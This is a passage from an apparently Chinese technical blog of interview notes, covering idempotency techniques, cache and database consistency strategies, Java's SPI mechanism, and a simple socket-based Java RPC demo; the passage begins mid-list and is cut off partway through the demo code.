1</li>\n<li>根据version版本，也就是在操作库存前先获取当前商品的version版本号，然后操作的时候带上此version号。我们梳理下，我们第一次操作库存时，得到version为1，调用库存服务version变成了2；但返回给订单服务出现了问题，订单服务又一次发起调用库存服务，当订单服务传如的version还是1，再执行上面的sql语句时，就不会执行；因为version已经变为2了，where条件就不成立。这样就保证了不管调用几次，只会真正的处理一次。</li>\n<li>乐观锁主要使用于处理读多写少的问题</li>\n</ul>\n<h4 id=\"3、唯一主键\"><a href=\"#3、唯一主键\" class=\"headerlink\" title=\"3、唯一主键\"></a>3、唯一主键</h4><p>这个机制是利用了数据库的主键唯一约束的特性，解决了在insert场景时幂等问题。但主键的要求不是自增的主键，这样就需要业务生成全局唯一的主键。</p>\n<p>如果是分库分表场景下，路由规则要保证相同请求下，落地在同一个数据库和同一表中，要不然数据库主键约束就不起效果了，因为是不同的数据库和表主键不相关</p>\n<h4 id=\"4、防重表\"><a href=\"#4、防重表\" class=\"headerlink\" title=\"4、防重表\"></a>4、防重表</h4><p>使用订单号orderNo做为去重表的唯一索引，把唯一索引插入去重表，再进行业务操作，且他们在同一个事务中。这个保证了重复请求时，因为去重表有唯一约束，导致请求失败，避免了幂等问题。这里要注意的是，去重表和业务表应该在同一库中，这样就保证了在同一个事务，即使业务操作失败了，也会把去重表的数据回滚。这个很好的保证了数据一致性。</p>\n<h4 id=\"5、唯一ID\"><a href=\"#5、唯一ID\" class=\"headerlink\" title=\"5、唯一ID\"></a>5、唯一ID</h4><p>调用接口时，生成一个唯一id，redis将数据保存到集合中（去重），存在即处理过。</p>\n<h2 id=\"缓存和数据库不一致问题\"><a href=\"#缓存和数据库不一致问题\" class=\"headerlink\" title=\"缓存和数据库不一致问题\"></a>缓存和数据库不一致问题</h2><h3 id=\"更新缓存和更新数据库\"><a href=\"#更新缓存和更新数据库\" class=\"headerlink\" title=\"更新缓存和更新数据库\"></a>更新缓存和更新数据库</h3><p>大部分观点认为，做缓存不应该是去更新缓存，而是应该删除缓存，然后由下个请求去去缓存，发现不存在后再读取数据库，写入缓存。观点引用：《分布式之数据库和缓存双写一致性方案解析》孤独烟</p>\n<p>原因一：线程安全角度同时有请求A和请求B进行更新操作，那么会出现（1）线程A更新了数据库（2）线程B更新了数据库（3）线程B更新了缓存（4）线程A更新了缓存这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。</p>\n<p>原因二：业务场景角度有如下两点：</p>\n<ol>\n<li>如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。</li>\n<li>如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。</li>\n</ol>\n<h3 id=\"删缓存和更新数据库\"><a href=\"#删缓存和更新数据库\" class=\"headerlink\" title=\"删缓存和更新数据库\"></a>删缓存和更新数据库</h3><h4 id=\"先删缓存，再更新数据库\"><a href=\"#先删缓存，再更新数据库\" class=\"headerlink\" title=\"先删缓存，再更新数据库\"></a>先删缓存，再更新数据库</h4><p>该方案会导致请求数据不一致同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:</p>\n<ol>\n<li>请求A进行写操作，删除缓存</li>\n<li>请求B查询发现缓存不存在</li>\n<li>请求B去数据库查询得到旧值</li>\n<li>请求B将旧值写入缓存</li>\n<li>请求A将新值写入数据库上述情况就会导致不一致的情形出现。<br>而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。</li>\n</ol>\n<h4 id=\"先更新数据库，再删缓存\"><a href=\"#先更新数据库，再删缓存\" class=\"headerlink\" title=\"先更新数据库，再删缓存\"></a>先更新数据库，再删缓存</h4><p>这种情况不存在并发问题么？不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生</p>\n<ol>\n<li>缓存刚好失效</li>\n<li>请求A查询数据库，得一个旧值</li>\n<li>请求B将新值写入数据库</li>\n<li>请求B删除缓存</li>\n<li>请求A将查到的旧值写入缓存ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。</li>\n</ol>\n<p>先更新数据库，再删缓存依然会有问题，不过，问题出现的可能性会因为上面说的原因，变得比较低！(补充说明：我用了“先更新数据库，再删缓存”且不设过期时间策略，会不会有问题呢？由于先缓存和更新数据库不是原子的，如果更新了数据库，程序歇逼，就没删缓存，由于没有过期策略，就永远脏数据了。)所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!</p>\n<h3 id=\"数据库和缓存数据强一致怎么办\"><a href=\"#数据库和缓存数据强一致怎么办\" class=\"headerlink\" title=\"数据库和缓存数据强一致怎么办\"></a>数据库和缓存数据强一致怎么办</h3><p>没有办法做到绝对的一致性，这是由CAP理论决定的，缓存系统适用的场景就是非强一致性的场景，所以它属于CAP中的AP。所以，我们得委曲求全，可以去做到BASE理论中说的最终一致性。</p>\n<p>大佬们给出了到达最终一致性的解决思路，主要是针对上面两种双写策略（先删缓存，再更新数据库&#x2F;先更新数据库，再删缓存）导致的脏数据问题，进行相应的处理，来保证最终一致性。</p>\n<h4 id=\"缓存延时双删\"><a href=\"#缓存延时双删\" class=\"headerlink\" title=\"缓存延时双删\"></a>缓存延时双删</h4><p>步骤</p>\n<ol>\n<li>先删除缓存</li>\n<li>再写数据库</li>\n<li>休眠500毫秒（根据具体的业务时间来定）</li>\n<li>再次删除缓存。</li>\n</ol>\n<h4 id=\"那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\"><a href=\"#那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\" class=\"headerlink\" title=\"那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\"></a>那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？</h4><p>针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。</p>\n<h4 id=\"如果你用了mysql的读写分离架构怎么办？\"><a href=\"#如果你用了mysql的读写分离架构怎么办？\" class=\"headerlink\" title=\"如果你用了mysql的读写分离架构怎么办？\"></a>如果你用了mysql的读写分离架构怎么办？</h4><p>ok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。</p>\n<ol>\n<li>请求A进行写操作，删除缓存</li>\n<li>请求A将数据写入数据库了，</li>\n<li>请求B查询缓存发现，缓存没有值</li>\n<li>请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值</li>\n<li>请求B将旧值写入缓存</li>\n<li>数据库完成主从同步，从库变为新值上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。</li>\n</ol>\n<h4 id=\"采用这种同步淘汰策略，吞吐量降低怎么办？\"><a href=\"#采用这种同步淘汰策略，吞吐量降低怎么办？\" class=\"headerlink\" title=\"采用这种同步淘汰策略，吞吐量降低怎么办？\"></a>采用这种同步淘汰策略，吞吐量降低怎么办？</h4><p>ok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。</p>\n<h4 id=\"删缓存失败了怎么办：重试机制\"><a href=\"#删缓存失败了怎么办：重试机制\" class=\"headerlink\" title=\"删缓存失败了怎么办：重试机制\"></a>删缓存失败了怎么办：重试机制</h4><p>看似问题都已经解决了，但其实，还有一个问题没有考虑到，那就是删除缓存的操作，失败了怎么办？比如延时双删的时候，第二次缓存删除失败了，那不还是没有清除脏数据吗？解决方案就是再加上一个重试机制，保证删除缓存成功</p>\n<p>流程如下所示</p>\n<ol>\n<li>更新数据库数据；</li>\n<li>缓存因为种种问题删除失败</li>\n<li>将需要删除的key发送至消息队列</li>\n<li>自己消费消息，获得需要删除的key</li>\n<li>继续重试删除操作，直到成功然而，</li>\n</ol>\n<p>该方案有一个缺点，对业务线代码造成大量的侵入。</p>\n<p>于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作</p>\n<h4 id=\"binlog\"><a href=\"#binlog\" class=\"headerlink\" title=\"binlog\"></a>binlog</h4><p>流程如下所示</p>\n<ol>\n<li>更新数据库数据</li>\n<li>数据库会将操作信息写入binlog日志当中</li>\n<li>订阅程序提取出所需要的数据以及key</li>\n<li>另起一段非业务代码，获得该信息</li>\n<li>尝试删除缓存操作，发现删除失败</li>\n<li>将这些信息发送至消息队列</li>\n<li>重新从消息队列中获得该数据，重试操作。</li>\n</ol>\n<h2 id=\"什么是SPI\"><a href=\"#什么是SPI\" class=\"headerlink\" title=\"什么是SPI\"></a>什么是SPI</h2><p>SPI 全称为 (Service Provider Interface) ，是JDK内置的一种服务提供发现机制</p>\n<h3 id=\"SPI-实践\"><a href=\"#SPI-实践\" class=\"headerlink\" title=\"SPI 实践\"></a>SPI 实践</h3><p>接下来我们来如何来利用 SPI 实现刚才提到的可拔插 IOC 容器。</p>\n<p>既然刚才都提到了 SPI 的本质就是面向接口编程，所以自然我们首先需要定义一个接口：</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"SPI图\"></p>\n<p>其中包含了一些 Bean 容器所必须的操作：注册、获取、释放 bean。</p>\n<p>为了让其他人也能实现自己的 IOC 容器，所以我们将这个接口单独放到一个 Module 中，可供他人引入实现。</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/2.png\"></p>\n<p>所以当我要实现一个单例的 IOC 容器时，我只需要新建一个 Module 然后引入刚才的模块并实现 CicadaBeanFactory 接口即可。</p>\n<p>当然其中最重要的则是需要在 resources 目录下新建一个 META-INF&#x2F;services&#x2F;top.crossoverjie.cicada.base.bean.CicadaBeanFactory 文件，文件名必须得是我们之前定义接口的全限定名（SPI 规范）。<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/3.png\"></p>\n<p>其中的内容便是我们自己实现类的全限定名：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">top.crossoverjie.cicada.bean.ioc.CicadaIoc</span><br></pre></td></tr></table></figure>\n<p>可以想象最终会通过这里的全限定名来反射创建对象。</p>\n<p>只不过这个过程 Java 已经提供 API 屏蔽掉了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> CicadaBeanFactory <span class=\"title function_\">getCicadaBeanFactory</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    ServiceLoader&lt;CicadaBeanFactory&gt; cicadaBeanFactories = ServiceLoader.load(CicadaBeanFactory.class);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cicadaBeanFactories.iterator().hasNext())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cicadaBeanFactories.iterator().next() ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CicadaDefaultBean</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当 classpath 中存在我们刚才的实现类（引入实现类的 jar 包），便可以通过 java.util.ServiceLoader 工具类来找到所有的实现类（可以有多个实现类同时存在，只不过通常我们只需要一个）。</p>\n<p>一些都准备好之后，使用自然就非常简单了。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>top.crossoverjie.opensource<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>cicada-ioc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.4<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我们只需要引入这个依赖便能使用它的实现，当我们想换一种实现方式时只需要更换一个依赖即可。</p>\n<p>这样就做到了不修改一行代码灵活的可拔插选择 IOC 容器了。</p>\n<p>SPI 的一些其他应用</p>\n<p>MySQL 的驱动包也是利用 SPI 来实现自己的连接逻辑。</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/4.png\"></p>\n<p>总结来说：</p>\n<ul>\n<li>提供一个接口</li>\n<li>在resource下新建META-INF&#x2F;services目录，在目录下新建接口的全限定名文件</li>\n<li>服务方实现接口</li>\n<li>调用ServiceLoad.load()</li>\n</ul>\n<h2 id=\"什么是RPC？\"><a href=\"#什么是RPC？\" class=\"headerlink\" title=\"什么是RPC？\"></a>什么是RPC？</h2><p>RPC（Remote Procedure Call）远程过程调用，简单的理解是一个节点请求另一个节点提供的服务</p>\n<ol>\n<li>首先客户端需要告诉服务器，需要调用的函数，这里函数和进程ID存在一个映射，客户端远程调用时，需要查一下函数，找到对应的ID，然后执行函数的代码。</li>\n<li>客户端需要把本地参数传给远程函数，本地调用的过程中，直接压栈即可，但是在远程调用过程中不再同一个内存里，无法直接传递函数的参数，因此需要客户端把参数转换成字节流，传给服务端，然后服务端将字节流转换成自身能读取的格式，是一个序列化和反序列化的过程。</li>\n<li>数据准备好了之后，如何进行传输？网络传输层需要把调用的ID和序列化后的参数传给服务端，然后把计算好的结果序列化传给客户端，因此TCP层即可完成上述过程，gRPC中采用的是HTTP2协议。</li>\n</ol>\n<p>总结一下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">// Client端 </span><br><span class=\"line\">//    Student student = Call(ServerAddr, addAge, student)</span><br><span class=\"line\">1. 将这个调用映射为Call ID。</span><br><span class=\"line\">2. 将Call ID，student（params）序列化，以二进制形式打包</span><br><span class=\"line\">3. 把2中得到的数据包发送给ServerAddr，这需要使用网络传输层</span><br><span class=\"line\">4. 等待服务器返回结果</span><br><span class=\"line\">5. 如果服务器调用成功，那么就将结果反序列化，并赋给student，年龄更新</span><br><span class=\"line\"></span><br><span class=\"line\">// Server端</span><br><span class=\"line\">1. 在本地维护一个Call ID到函数指针的映射call_id_map，可以用Map&lt;String, Method&gt; callIdMap</span><br><span class=\"line\">2. 等待客户端请求</span><br><span class=\"line\">3. 得到一个请求后，将其数据包反序列化，得到Call ID</span><br><span class=\"line\">4. 通过在callIdMap中查找，得到相应的函数指针</span><br><span class=\"line\">5. 将student（params）反序列化后，在本地调用addAge()函数，得到结果</span><br><span class=\"line\">6. 将student结果序列化后通过网络返回给Client</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在微服务的设计中，一个服务A如果访问另一个Module下的服务B，可以采用HTTP REST传输数据，并在两个服务之间进行序列化和反序列化操作，服务B把执行结果返回过来。</li>\n<li>由于HTTP在应用层中完成，整个通信的代价较高，远程过程调用中直接基于TCP进行远程调用，数据传输在传输层TCP层完成，更适合对效率要求比较高的场景，RPC主要依赖于客户端和服务端之间建立Socket链接进行，底层实现比REST更复杂。</li>\n</ul>\n<h3 id=\"RPC-demo\"><a href=\"#RPC-demo\" class=\"headerlink\" title=\"RPC demo\"></a>RPC demo</h3><p>客户端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCClient</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">getRemoteProxyObj</span><span class=\"params\">(<span class=\"keyword\">final</span> Class&lt;?&gt; serviceInterface, <span class=\"keyword\">final</span> InetSocketAddress addr)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1.将本地的接口调用转换成JDK的动态代理，在动态代理中实现接口的远程调用</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (T) Proxy.newProxyInstance(serviceInterface.getClassLoader(), <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>&lt;?&gt;[]&#123;serviceInterface&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvocationHandler</span>() &#123;</span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"keyword\">public</span> Object <span class=\"title function_\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                        <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                            <span class=\"comment\">// 2.创建Socket客户端，根据指定地址连接远程服务提供者</span></span><br><span class=\"line\">                            socket = <span class=\"keyword\">new</span> <span class=\"title class_\">Socket</span>();</span><br><span class=\"line\">                            socket.connect(addr);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"comment\">// 3.将远程服务调用所需的接口类、方法名、参数列表等编码后发送给服务提供者</span></span><br><span class=\"line\">                            output = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(socket.getOutputStream());</span><br><span class=\"line\">                            output.writeUTF(serviceInterface.getName());</span><br><span class=\"line\">                            output.writeUTF(method.getName());</span><br><span class=\"line\">                            output.writeObject(method.getParameterTypes());</span><br><span class=\"line\">                            output.writeObject(args);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"comment\">// 4.同步阻塞等待服务器返回应答，获取应答后返回</span></span><br><span class=\"line\">                            input = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(socket.getInputStream());</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> input.readObject();</span><br><span class=\"line\">                        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (socket != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                socket.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (output != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                output.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (input != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                input.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>服务端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceCenter</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Server</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">ExecutorService</span> <span class=\"variable\">executor</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> HashMap&lt;String, Class&gt; serviceRegistry = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, Class&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"variable\">isRunning</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> port;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ServiceCenter</span><span class=\"params\">(<span class=\"type\">int</span> port)</span>&#123;</span><br><span class=\"line\">        ServiceCenter.port = port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">start</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ServerSocket</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerSocket</span>();</span><br><span class=\"line\">        server.bind(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(port));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Server Start .....&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                executor.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">ServiceTask</span>(server.accept()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            server.close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">register</span><span class=\"params\">(Class serviceInterface, Class impl)</span> &#123;</span><br><span class=\"line\">        serviceRegistry.put(serviceInterface.getName(), impl);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isRunning</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> isRunning;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getPort</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">stop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        isRunning = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        executor.shutdown();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceTask</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Socket</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"title function_\">ServiceTask</span><span class=\"params\">(Socket client)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.client = client;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                input = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(client.getInputStream());</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">serviceName</span> <span class=\"operator\">=</span> input.readUTF();</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">methodName</span> <span class=\"operator\">=</span> input.readUTF();</span><br><span class=\"line\">                Class&lt;?&gt;[] parameterTypes = (Class&lt;?&gt;[]) input.readObject();</span><br><span class=\"line\">                Object[] arguments = (Object[]) input.readObject();</span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">serviceClass</span> <span class=\"operator\">=</span> serviceRegistry.get(serviceName);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(serviceClass == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassNotFoundException</span>(serviceName + <span class=\"string\">&quot;not found!&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> serviceClass.getMethod(methodName, parameterTypes);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> method.invoke(serviceClass.newInstance(), arguments);</span><br><span class=\"line\"></span><br><span class=\"line\">                output = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(client.getOutputStream());</span><br><span class=\"line\">                output.writeObject(result);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(output!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                        output.close();</span><br><span class=\"line\">                    &#125;<span class=\"keyword\">catch</span> (IOException e)&#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (input != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        input.close();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (client != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        client.close();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceProducerImpl</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ServiceProducer</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">sendData</span><span class=\"params\">(String data)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;I am service producer!!!, the data is &quot;</span>+ data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title 